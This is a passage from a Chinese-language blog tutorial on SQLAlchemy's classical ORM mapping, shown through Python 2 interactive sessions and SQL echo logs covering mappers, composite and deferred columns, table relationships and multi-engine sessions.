      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengsi/",
    "content": "<p><strong>1  ORM模型的简单性简化了数据库查询过程。使用ORM查询工具，用户可以访问期望数据，而不必理解数据库的底层结构</strong></p>\n\n<p>以下是SQL语句:\nregion_table = Table(\n'region', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('name', Unicode(255)))\n相应的类:\nclass Region(object):</p>\n\n<p>def __init__(self, name):\nself.name = name</p>\n\n<p>def __repr__(self):\nreturn '&lt;Region %s&gt;' % self.name</p>\n\n<p>看一下在交互模式下:</p>\n\n<p>&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n&gt;&gt;&gt; mapper(Region,region_table)  #ORM映射\n&lt;Mapper at 0x84bdb2c; Region&gt;\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_sa_class_manager', 'id', 'name'] #增加了很多属性\n&gt;&gt;&gt; Region.id\n&lt;sqlalchemy.orm.attributes.InstrumentedAttribute object at 0x84c238c&gt;\n&gt;&gt;&gt; Region.name\n&lt;sqlalchemy.orm.attributes.InstrumentedAttribute object at 0x84c254c&gt;</p>\n\n<p>&gt;&gt;&gt; r0 = Region(name=\"Northeast\")\n&gt;&gt;&gt; r1 = Region(name=\"Southwest\")\n&gt;&gt;&gt; r0\n&lt;Region Northeast&gt;  #类能显示这样的数据是因为类定义了__repr__方法\n&gt;&gt;&gt; r1\n&lt;Region Southwest&gt;\n&gt;&gt;&gt; from sqlalchemy.orm import clear_mappers\n&gt;&gt;&gt; clear_mappers() #取消映射\n&gt;&gt;&gt; Region.name #不再有这个属性\nTraceback (most recent call last):\nFile \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nAttributeError: type object 'Region' has no attribute 'name'\n&gt;&gt;&gt; dir(Region)  #回到了原来的只有类属性\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']</p>\n\n<p>&gt;&gt;&gt; r0 = Region(name=\"Northeast\")  #从这里开始理解ORM做了什么\n&gt;&gt;&gt; r1 = Region(name=\"Southwest\") #实现了2个类的实例</p>\n\n<p>&gt;&gt;&gt; metadata.create_all(engine) #创建table</p>\n\n<p>&gt;&gt;&gt; Session = sessionmaker()  #通过sessionmaker产生一个会话\n&gt;&gt;&gt; Session.configure(bind=engine) #绑定到数据库连接\n&gt;&gt;&gt; session = Session()  #产生会话实例,让对象可以被载入或保存到数据库,而只需要访问类却不用直接访问数据库\n&gt;&gt;&gt; session.bind.echo = True #显示打印信息</p>\n\n<p>&gt;&gt;&gt; session.add(r1) #把r0,r12个实例加到会话中\n&gt;&gt;&gt; session.add(r0)\n&gt;&gt;&gt; print r0.id  #因为还没有保存,数据为空\nNone\n&gt;&gt;&gt; session.flush() #提交数据到数据库\n2012-07-18 10:24:07,116 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 10:24:07,116 INFO sqlalchemy.engine.base.Engine INSERT INTO region (name) VALUES (?)\n2012-07-18 10:24:07,116 INFO sqlalchemy.engine.base.Engine ('Southwest',)\n2012-07-18 10:24:07,117 INFO sqlalchemy.engine.base.Engine INSERT INTO region (name) VALUES (?)\n2012-07-18 10:24:07,117 INFO sqlalchemy.engine.base.Engine ('Northeast',)\n&gt;&gt;&gt; print r0.id #id因为子增长,出现了\n2\n&gt;&gt;&gt; r0.name = 'Northwest'\n&gt;&gt;&gt; session.flush() #修改提交\n2012-07-18 10:24:50,644 INFO sqlalchemy.engine.base.Engine UPDATE region SET name=? WHERE region.id = ?\n2012-07-18 10:24:50,644 INFO sqlalchemy.engine.base.Engine ('Northwest', 2)\n&gt;&gt;&gt; print r0.name #数据库中的数据被update成了新值\nNorthwest\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n&gt;&gt;&gt; mapper(Region, region_table, include_properties=['id']) #使用 include_properties只映射某些字段,同样还有exclude_properties\n&lt;Mapper at 0x84c26cc; Region&gt;\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_sa_class_manager', 'id']  #只多了一个\"id\"</p>\n\n<p>&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n&gt;&gt;&gt; mapper(Region, region_table, column_prefix='_')  #映射后自定义修改新属性的前缀\n&lt;Mapper at 0x84f73ac; Region&gt;\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_id', '_name', '_sa_class_manager'] #id和name等前面都有了\"_\"</p>\n\n<p>&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n&gt;&gt;&gt; mapper(Region, region_table, properties=dict(\n...     region_name=region_table.c.name,  #想把name的属性定义为region_name,因为c.name就是用Table创建的表结构的特定实例的name属性\n...     region_id=region_table.c.id))\n&lt;Mapper at 0x8509d2c; Region&gt;\n&gt;&gt;&gt; dir(Region)\n['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_sa_class_manager', 'region_id', 'region_name']  #id改名为region_id</p>\n\n<p>&gt;&gt;&gt; class Region(object):  #重新定义类\n...     def __init__(self, name):\n...         self.name = name\n...     def __repr__(self):\n...         return '&lt;Region %s&gt;' % self.name\n...     def _get_name(self): #这个_get和_set是为了让内置的property调用\n...         return self._name\n...     def _set_name(self, value):\n...         assert value.endswith('Region'), \\\n...             'Region names must end in \"Region\"'\n...         self._name = value\n...     name=property(_get_name, _set_name) #<span style=\"font-family: Tahoma; font-size: small;\">通过property的定义，当获取成员x的值时，就会调用_get_name函数(第一个参数)，当给成员x赋值时，就会调用_set_name函数(第二个参数)，当删除x时，就会调用delx函数</span>(这里没有设置)\n...\n&gt;&gt;&gt; from sqlalchemy.orm import synonym\n&gt;&gt;&gt; mapper(Region, region_table, column_prefix='_', properties=dict(\n...     name=synonym('_name'))) #首先检验_name的属性是否满足\n&lt;Mapper at 0x84f7acc; Region&gt;\n&gt;&gt;&gt; s0 = Region('Southeast')  #没有正确结尾\nTraceback (most recent call last):\nFile \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nFile \"&lt;string&gt;\", line 4, in __init__\nFile \"/usr/lib/python2.7/site-packages/SQLAlchemy-0.7.8-py2.7-linux-i686.egg/sqlalchemy/orm/state.py\", line 98, in initialize_instance\nreturn manager.original_init(*mixed[1:], **kwargs)\nFile \"&lt;stdin&gt;\", line 3, in __init__\nFile \"&lt;string&gt;\", line 1, in __set__\nFile \"&lt;stdin&gt;\", line 10, in _set_name\nAssertionError: Region names must end in \"Region\"\n&gt;&gt;&gt; s0 = Region('Southeast Region') #正常</p>\n\n<p>&gt;&gt;&gt; segment_table = Table(\n...     'segment', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('lat0', Float),\n...     Column('long0', Float),\n...     Column('lat1', Float),\n...     Column('long1', Float))</p>\n\n<p>&gt;&gt;&gt; metadata.create_all(engine) #创建表\n&gt;&gt;&gt; class RouteSegment(object): #一个含有begin和end的类\n...     def __init__(self, begin, end):\n...         self.begin = begin\n...         self.end = end\n...     def __repr__(self):\n...         return '&lt;Route %s to %s&gt;' % (self.begin, self.end)\n...\n&gt;&gt;&gt; class MapPoint(object):\n...     def __init__(self, lat, long):\n...         self.coords = lat, long\n...     def __composite_values__(self): #返回比较后的列表或者元祖\n...         return self.coords\n...     def __eq__(self, other):\n...         return self.coords == other.coords\n...     def __ne__(self, other):\n...         return self.coords != other.coords\n...     def __repr__(self):\n...         return '(%s lat, %s long)' % self.coords\n...\n...</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.orm import composite\n&gt;&gt;&gt; mapper(RouteSegment, segment_table, properties=dict(\n...     begin=composite(MapPoint,  #创建多个属性\n...         segment_table.c.lat0,\n...         segment_table.c.long0),\n...     end=composite(MapPoint,\n...         segment_table.c.lat1, segment_table.c.long1)))\n&lt;Mapper at 0x86203cc; RouteSegment&gt;\n&gt;&gt;&gt; work=MapPoint(33.775562,-84.29478)\n&gt;&gt;&gt; library=MapPoint(34.004313,-84.452062)\n&gt;&gt;&gt; park=MapPoint(33.776868,-84.389785)\n&gt;&gt;&gt; routes = [\n...     RouteSegment(work, library),\n...     RouteSegment(work, park),\n...     RouteSegment(library, work),\n...     RouteSegment(library, park),\n...     RouteSegment(park, library),\n...     RouteSegment(park, work)]</p>\n\n<p>&gt;&gt;&gt; for rs in routes:\n...     session.add(rs)\n...\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; q = session.query(RouteSegment)\n&gt;&gt;&gt; print RouteSegment.begin==work\nsegment.lat0 = :lat0_1 AND segment.long0 = :long0_1\n&gt;&gt;&gt; q = q.filter(RouteSegment.begin==work)\n&gt;&gt;&gt; for rs in q:\n...     print rs\n...\n2012-07-18 11:12:29,360 INFO sqlalchemy.engine.base.Engine SELECT segment.id AS segment_id, segment.lat0 AS segment_lat0, segment.long0 AS segment_long0, segment.lat1 AS segment_lat1, segment.long1 AS segment_long1\nFROM segment\nWHERE segment.lat0 = ? AND segment.long0 = ?\n2012-07-18 11:12:29,360 INFO sqlalchemy.engine.base.Engine (33.775562, -84.29478)\n&lt;Route (33.775562 lat, -84.29478 long) to (34.004313 lat, -84.452062 long)&gt;\n&lt;Route (33.775562 lat, -84.29478 long) to (33.776868 lat, -84.389785 long)&gt;</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.orm import PropComparator\n&gt;&gt;&gt; class MapPointComparator(PropComparator): #自定义运算符继承PropComparator类\n...     def __lt__(self, other):  #自定义小于运算结果\n...         return and_(*[a&lt;b for a, b in\n...             zip(self.prop.columns,\n...                 other.__composite_values__())])\n...\n&gt;&gt;&gt; mapper(RouteSegment, segment_table, properties=dict(\n...     begin=composite(MapPoint,\n...                     segment_table.c.lat0, segment_table.c.long0,\n...                     comparator=MapPointComparator),  #定义使用自定义的运算类\n...     end=composite(MapPoint,\n...                   segment_table.c.lat1, segment_table.c.long1,\n...                   comparator=MapPointComparator)))\n&lt;Mapper at 0x85b2bac; RouteSegment&gt;\n&gt;&gt;&gt; product_table = Table(\n... 'product', metadata,\n... Column('sku', String(20), primary_key=True),\n... Column('msrp', Numeric),\n... Column('image', BLOB))\n&gt;&gt;&gt; from sqlalchemy.orm import deferred\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     image=deferred(product_table.c.image)))  #deferred意思是延迟,就是在实现 mapper 时，可以指定某些字段是 Deferred 装入的，这样象通常一样取出数据时，这些字段并不真正的从数据库中取出，只有在你真正需要时才取出，这样可以减少资源的占用和提高效率,只有在读取 image时才会取出相应的数据\n&lt;Mapper at 0x862a40c; Product&gt;</p>\n\n<p>&gt;&gt;&gt; metadata.remove(product_table)  #因为已经常见了表,先删除\n&gt;&gt;&gt; product_table = Table(\n...     'product', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric),\n...     Column('image1', Binary),\n...     Column('image2', Binary),\n...     Column('image3', Binary))</p>\n\n<p>&gt;&gt;&gt; clear_mappers() #已经映射,先取消\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     image1=deferred(product_table.c.image1, group='images'),\n...     image2=deferred(product_table.c.image2, group='images'),\n...     image3=deferred(product_table.c.image3, group='images'))) #Deferred字段可以通过在 properties 中指定 group参数来表示编组情况。这样当一个组的某个</p>\n\n<p>#字段被取出时， 同组的其它字段均被取出\n&lt;Mapper at 0x85b8c4c; Product&gt;</p>\n\n<p>&gt;&gt;&gt; q = product_table.join(  被映射的是join了product_summary_table到product_table的结果\n... product_summary_table,\n... product_table.c.sku==product_summary_table.c.sku).alias('full_product')\n&gt;&gt;&gt; class FullProduct(object): pass\n...\n&gt;&gt;&gt; mapper(FullProduct, q)\n&lt;Mapper at 0x86709cc; FullProduct&gt;</p>\n\n<p>mapper函数的一些参数:</p>\n\n<p>always_refresh =False:返回查询旧会修改内存中的值,但是populate_existing优先级高</p>\n\n<p>allow_column_override =False:允许关系属性将具有相同的名称定义为一个映射列,否则名称冲突,产生异常</p>\n\n<p><strong>2 ORM的关系</strong></p>\n\n<p><strong>1 1:N relations (1对多)</strong></p>\n\n<p>&gt;&gt;&gt; mapper(Store, store_table)\n&lt;Mapper at 0x84fba4c; Store&gt;\n&gt;&gt;&gt; from sqlalchemy.orm import relation\n&gt;&gt;&gt; mapper(Region, region_table, properties=dict(\n...     stores=relation(Store))) #让2个表关联,给Region添加一个属性stores,通过它联系Store来修改Store\n&lt;Mapper at 0x84f76ac; Region&gt;</p>\n\n<p>&gt;&gt;&gt; r0 = Region('test')</p>\n\n<p><strong></strong>&gt;&gt;&gt; session.add(r0) #先生成一条数据\n&gt;&gt;&gt; session.commit()\n2012-07-18 13:56:26,858 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 13:56:26,859 INFO sqlalchemy.engine.base.Engine INSERT INTO region (name) VALUES (?)\n2012-07-18 13:56:26,859 INFO sqlalchemy.engine.base.Engine ('test',)\n2012-07-18 13:56:26,859 INFO sqlalchemy.engine.base.Engine COMMIT\n&gt;&gt;&gt; rgn = session.query(Region).get(1)  #获取这条数据\n2012-07-18 13:56:37,250 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 13:56:37,251 INFO sqlalchemy.engine.base.Engine SELECT region.id AS region_id, region.name AS region_name\nFROM region\nWHERE region.id = ?\n2012-07-18 13:56:37,251 INFO sqlalchemy.engine.base.Engine (1,)\n&gt;&gt;&gt; s0 = Store(name='3rd and Juniper') #创建一个实例\n&gt;&gt;&gt; rgn.stores.append(s0) #通过Region的依赖建立新的Store(其中的一个字段region_id值来着region的id字段)\n2012-07-18 13:56:51,611 INFO sqlalchemy.engine.base.Engine SELECT store.id AS store_id, store.region_id AS store_region_id, store.name AS store_name\nFROM store\nWHERE ? = store.region_id\n2012-07-18 13:56:51,611 INFO sqlalchemy.engine.base.Engine (1,)\n&gt;&gt;&gt; session.flush() #保存数据库\n2012-07-18 13:57:02,131 INFO sqlalchemy.engine.base.Engine INSERT INTO store (region_id, name) VALUES (?, ?)\n2012-07-18 13:57:02,131 INFO sqlalchemy.engine.base.Engine (1, '3rd and Juniper')\n注:假如2个表之间有多个外部依赖关系,需要使用primaryjoin指定:</p>\n\n<p>mapper(Region, region_table, properties=dict(\nstores=relation(Store,\nprimaryjoin=(store_table.c.region_id  #判断关系来着region_id和region的id\n==region_table.c.id))))</p>\n\n<p><strong>2 M:N relations(多对多)</strong></p>\n\n<p>上面有SQL语句:我复制过来:</p>\n\n<p>category_table = Table(\n'category', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('level_id', None, ForeignKey('level.id')),\nColumn('parent_id', None, ForeignKey('category.id')),\nColumn('name', String(20)))\nproduct_table = Table(\n'product', metadata,\nColumn('sku', String(20), primary_key=True),\nColumn('msrp', Numeric))\nproduct_category_table = Table(\n'product_category', metadata,\nColumn('product_id', None, ForeignKey('product.sku'), primary_key=True),\nColumn('category_id', None, ForeignKey('category.id'), primary_key=True))</p>\n\n<p>可以看出来product_category_table和category_table 是多对多的关系.</p>\n\n<p>&gt;&gt;&gt; mapper(Category, category_table, properties=dict(\n...     products=relation(Product,\n...     secondary=product_category_table)))\n&lt;Mapper at 0x859c8cc; Category&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     categories=relation(Category,\n...     secondary=product_category_table)))\n&lt;Mapper at 0x859c5cc; Product&gt;</p>\n\n<p>&gt;&gt;&gt; r0=Product('123','234')</p>\n\n<p>&gt;&gt;&gt; session.add(r0)\n&gt;&gt;&gt; session.flush()\n2012-07-18 14:18:06,599 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 14:18:06,618 INFO sqlalchemy.engine.base.Engine INSERT INTO product (sku, msrp) VALUES (?, ?)\n2012-07-18 14:18:06,618 INFO sqlalchemy.engine.base.Engine ('123', 234.0)\n&gt;&gt;&gt; session.query(Product).get('123').categories</p>\n\n<p>&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; mapper(Category, category_table, properties=dict(\n...     products=relation(Product, secondary=product_category_table,\n... primaryjoin=(product_category_table.c.category_id  #primaryjoin是要被映射的表和连接表的条件\n...                                    == category_table.c.id),\n... secondaryjoin=(product_category_table.c.product_id  #secondaryjoin是连接表和想加入的表的条件\n...                                      == product_table.c.sku))))\n&lt;Mapper at 0x84ff7cc; Category&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     categories=relation(Category, secondary=product_category_table,\n... primaryjoin=(product_category_table.c.product_id\n...                                      == product_table.c.sku),\n... secondaryjoin=(product_category_table.c.category_id\n...                                        == category_table.c.id))))\n&lt;Mapper at 0x859cb8c; Product&gt;\n<strong>1:1 relations(一对一)</strong>:特殊的(1:N)\n还是上面的SQL:</p>\n\n<p>product_table = Table(\n'product', metadata,\nColumn('sku', String(20), primary_key=True),\nColumn('msrp', Numeric))\nproduct_summary_table = Table(\n'product_summary', metadata,\nColumn('sku', None, ForeignKey('product.sku'), primary_key=True), #只有一个外联到product\nColumn('name', Unicode(255)),\nColumn('description', Unicode))</p>\n\n<p>&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     summary=relation(ProductSummary)))\nKeyboardInterrupt\n&gt;&gt;&gt; mapper(ProductSummary, product_summary_table)\n&lt;Mapper at 0x84fbe6c; ProductSummary&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     summary=relation(ProductSummary)))\n&lt;Mapper at 0x85bee6c; Product&gt;\n&gt;&gt;&gt; prod = session.query(Product).get('123')\n[]  #product_summary_table因为product_table儿存在,浪费了</p>\n\n<p>&gt;&gt;&gt; mapper(ProductSummary, product_summary_table)\n&lt;Mapper at 0x84f7dec; ProductSummary&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     summary=relation(ProductSummary,uselist=False)))  #使用uselist=False就不会这样了\n&lt;Mapper at 0x860584c; Product&gt;\n&gt;&gt;&gt; prod = session.query(Product).get('123')\n&gt;&gt;&gt; print prod.summary\nNone\n&gt;&gt;&gt; mapper(ProductSummary, product_summary_table)\n&lt;Mapper at 0x859ca0c; ProductSummary&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     summary=relation(ProductSummary, uselist=False,\n...     backref='product'))) #自定义自己表的函数\n&lt;Mapper at 0x860e90c; Product&gt;\n&gt;&gt;&gt; prod = session.query(Product).get('123')\n&gt;&gt;&gt; prod.summary = ProductSummary(name=\"Fruit\", description=\"Some\n... Fruit\")\n&gt;&gt;&gt; print prod.summary\n&lt;ProductSummary Fruit&gt;\n&gt;&gt;&gt; print prod.summary.product #他的属性就是prod,可就是表本身\n&lt;Product 123&gt;\n&gt;&gt;&gt; print prod.summary.product is prod\nTrue</p>\n\n<p>&gt;&gt;&gt; mapper(Level, level_table, properties=dict(\n...     categories=relation(Category, backref='level')))\n&lt;Mapper at 0x860590c; Level&gt;\n&gt;&gt;&gt; mapper(Category, category_table, properties=dict(\n...     products=relation(Product,\n...         secondary=product_category_table)))\n&lt;Mapper at 0x860ec8c; Category&gt;\n&gt;&gt;&gt; mapper(Product, product_table, properties=dict(\n...     categories=relation(Category,\n...         secondary=product_category_table)))\n&lt;Mapper at 0x860e7ec; Product&gt;\n&gt;&gt;&gt; lvl = Level(name='Department')\n&gt;&gt;&gt; cat = Category(name='Produce', level=lvl)\n&gt;&gt;&gt; session.add(lvl)\n&gt;&gt;&gt; session.flush()\n2012-07-18 14:44:02,005 INFO sqlalchemy.engine.base.Engine INSERT INTO level (parent_id, name) VALUES (?, ?)\n2012-07-18 14:44:02,005 INFO sqlalchemy.engine.base.Engine (None, 'Department')\n2012-07-18 14:44:02,020 INFO sqlalchemy.engine.base.Engine INSERT INTO category (level_id, parent_id, name) VALUES (?, ?, ?)\n2012-07-18 14:44:02,020 INFO sqlalchemy.engine.base.Engine (1, None, 'Produce')\n&gt;&gt;&gt; prod = session.query(Product).get('123')\n&gt;&gt;&gt; print prod.categories\n[]\n&gt;&gt;&gt; print cat.products\n2012-07-18 14:44:25,517 INFO sqlalchemy.engine.base.Engine SELECT product.sku AS product_sku, product.msrp AS product_msrp\nFROM product, product_category\nWHERE ? = product_category.category_id AND product.sku = product_category.product_id\n2012-07-18 14:44:25,517 INFO sqlalchemy.engine.base.Engine (1,)\n[]\n&gt;&gt;&gt; prod.categories.append(cat)\n&gt;&gt;&gt; print prod.categories\n[&lt;Category Department.Produce&gt;]\n&gt;&gt;&gt; print cat.products  #backref自动更新,在多对多的情况,可以使用relation函数两次,但是2个属性没有保持同步\n[]  #解决方法:</p>\n\n<p>&gt;&gt;&gt; mapper(Level, level_table, properties=dict(\n...categories=relation(Category, backref='level')))\n&gt;&gt;&gt; mapper(Category, category_table, properties=dict(\n...products=relation(Product, secondary=product_category_table,\n... backref='categories')))  #在Product也设置backref,就会保持同步\n&gt;&gt;&gt; mapper(Product, product_table)\n&gt;&gt;&gt; lvl = Level(name='Department')\n&gt;&gt;&gt; cat = Category(name='Produce', level=lvl)\n&gt;&gt;&gt; session.save(lvl)\n&gt;&gt;&gt; prod = session.query(Product).get('123')\n&gt;&gt;&gt; print prod.categories\n[]\n&gt;&gt;&gt; print cat.products\n[]\n&gt;&gt;&gt; prod.categories.append(cat)\n&gt;&gt;&gt; print prod.categories\n[&lt;Category Department.Produce&gt;]\n&gt;&gt;&gt;print cat.products\n[&lt;Product 123&gt;]</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.orm import backref\n&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; mapper(ProductSummary, product_summary_table, properties=dict(\n... product=relation(Product,\n... backref=backref('summary', uselist=False))))  #还可以使用backref函数做一样的事情\n&lt;Mapper at 0x860aaec; ProductSummary&gt;\n&gt;&gt;&gt; mapper(Product, product_table)\n&lt;Mapper at 0x85bee6c; Product&gt;</p>\n\n<p><strong>4 Self-Referential 自我参照映射</strong>\nlevel_table = Table(\n'level', metadata,\nColumn('id', Integer, primary_key=True),\nColumn('parent_id', None, ForeignKey('level.id')), #这个外联其实还是这个类的id,也就是映射了自己的对象\nColumn('name', String(20)))\n&gt;&gt;&gt; mapper(Level, level_table, properties=dict(\n... children=relation(Level))) #不同层次之间的父子关系,我这里指定得到\"子''的属性\n&lt;Mapper at 0x860a66c; Level&gt;\n&gt;&gt;&gt; mapper(Level, level_table, properties=dict(\n...     children=relation(Level,\n...     backref=backref('parent',\n...     remote_side=[level_table.c.id]))))  #remote_side指定'子'的id,local side”就是字段parent_id\n&lt;Mapper at 0x860e42c; Level&gt;\n&gt;&gt;&gt; l0 = Level('Gender')\n&gt;&gt;&gt; l1 = Level('Department', parent=l0)\n&gt;&gt;&gt; session.add(l0)\n&gt;&gt;&gt; session.flush()\n2012-07-18 15:07:55,810 INFO sqlalchemy.engine.base.Engine INSERT INTO level (parent_id, name) VALUES (?, ?)\n2012-07-18 15:07:55,810 INFO sqlalchemy.engine.base.Engine (None, 'Gender') #插入l0,他没有父级\n2012-07-18 15:07:55,810 INFO sqlalchemy.engine.base.Engine INSERT INTO level (parent_id, name) VALUES (?, ?)\n2012-07-18 15:07:55,810 INFO sqlalchemy.engine.base.Engine (2, 'Department')</p>\n\n<p>注 我们还能反过来用:</p>\n\n<p>mapper(Level, level_table, properties=dict(\nparent=relation(Level, remote_side=[level_table.c.parent_id],\nbackref='children')))</p>\n\n<p>我们创建一个多引擎的例子:</p>\n\n<p><pre class=\"sh_python\">\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import mapper, sessionmaker\nfrom sqlalchemy import Numeric,Table, MetaData, Column, ForeignKey, Integer, String\nengine1 = create_engine('sqlite://')\nengine2 = create_engine('sqlite://')\nmetadata = MetaData()\nproduct_table = Table(\n'product', metadata,\nColumn('sku', String(20), primary_key=True),\nColumn('msrp', Numeric))\nproduct_summary_table = Table(\n'product_summary', metadata,\nColumn('sku', String(20), ForeignKey('product.sku'), primary_key=True),\nColumn('name', Unicode(255)),\nColumn('description', Unicode))\nproduct_table.create(bind=engine1)\nproduct_summary_table.create(bind=engine2)\nstmt = product_table.insert()\nengine1.execute(\nstmt,\n[dict(sku=\"123\", msrp=12.34),\ndict(sku=\"456\", msrp=22.12),\ndict(sku=\"789\", msrp=41.44)])\nstmt = product_summary_table.insert()\nengine2.execute(\nstmt,\n[dict(sku=\"123\", name=\"Shoes\", description=\"Some Shoes\"),\ndict(sku=\"456\", name=\"Pants\", description=\"Some Pants\"),\ndict(sku=\"789\", name=\"Shirts\", description=\"Some Shirts\")])\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>这样就创建了表并且插入了一些数据</p>\n\n<p>dongwm@localhost ~ $ python\nPython 2.7.3 (default, Jul 11 2012, 10:10:17)\n[GCC 4.5.3] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from sqlalchemy import create_engine\n&gt;&gt;&gt; from sqlalchemy.orm import mapper, sessionmaker\n&gt;&gt;&gt; from sqlalchemy import Numeric,Table, MetaData, Column, ForeignKey, Integer, String,Unicode\n&gt;&gt;&gt; engine1 = create_engine('sqlite://')\n&gt;&gt;&gt; engine2 = create_engine('sqlite://')  #创建多个引擎\n&gt;&gt;&gt; metadata = MetaData()\n&gt;&gt;&gt; product_table = Table(\n... 'product', metadata,\n... Column('sku', String(20), primary_key=True),\n... Column('msrp', Numeric))\n&gt;&gt;&gt; product_summary_table = Table(\n... 'product_summary', metadata,\n... Column('sku', String(20), ForeignKey('product.sku'), primary_key=True),\n... Column('name', Unicode(255)),\n... Column('description', Unicode))\n&gt;&gt;&gt; product_table.create(bind=engine1)\n&gt;&gt;&gt; product_summary_table.create(bind=engine2)\n&gt;&gt;&gt; stmt = product_table.insert()\n&gt;&gt;&gt; engine1.execute(\n... stmt,\n... [dict(sku=\"123\", msrp=12.34),\n... dict(sku=\"456\", msrp=22.12),\n... dict(sku=\"789\", msrp=41.44)])\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x84ef9ec&gt;\n&gt;&gt;&gt; stmt = product_summary_table.insert()\n&gt;&gt;&gt; engine2.execute(  #用引擎2 插入数据,那么product_summary的数据就在这个引擎\n... stmt,\n... [dict(sku=\"123\", name=\"Shoes\", description=\"Some Shoes\"),\n... dict(sku=\"456\", name=\"Pants\", description=\"Some Pants\"),\n... dict(sku=\"789\", name=\"Shirts\", description=\"Some Shirts\")])\n/usr/lib/python2.7/site-packages/SQLAlchemy-0.7.8-py2.7-linux-i686.egg/sqlalchemy/engine/default.py:463: SAWarning: Unicode type received non-unicode bind param value.\nparam.append(processors[key](compiled_params[key]))\n&lt;sqlalchemy.engine.base.ResultProxy object at 0x84e896c&gt;\n&gt;&gt;&gt; class Product(object):\n...     def __init__(self, sku, msrp, summary=None):\n...         self.sku = sku\n...         self.msrp = msrp\n...         self.summary = summary\n...     def __repr__(self):\n...         return '&lt;Product %s&gt;' % self.sku\n...\n&gt;&gt;&gt; class ProductSummary(object):\n...     def __init__(self, name, description):\n...         self.name = name\n...         self.description = description\n...     def __repr__(self):\n...         return '&lt;ProductSummary %s&gt;' % self.name\n...\n&gt;&gt;&gt; from sqlalchemy.orm import clear_mappers,backref,relation\n&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; mapper(ProductSummary, product_summary_table, properties=dict(\n...     product=relation(Product,\n...                      backref=backref('summary', uselist=False))))\n&lt;Mapper at 0x84efa4c; ProductSummary&gt;\n&gt;&gt;&gt; mapper(Product, product_table)\n&lt;Mapper at 0x84efd0c; Product&gt;\n&gt;&gt;&gt; Session = sessionmaker(binds={Product:engine1,  #这里绑定了2个引擎,不同orm的引擎不同\n...     ProductSummary:engine2})\n&gt;&gt;&gt; session = Session()\n&gt;&gt;&gt; engine1.echo = engine2.echo = True\n&gt;&gt;&gt; session.query(Product).all() #查询product的数据\n2012-07-18 19:00:59,514 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)\n2012-07-18 19:00:59,514 INFO sqlalchemy.engine.base.Engine SELECT product.sku AS product_sku, 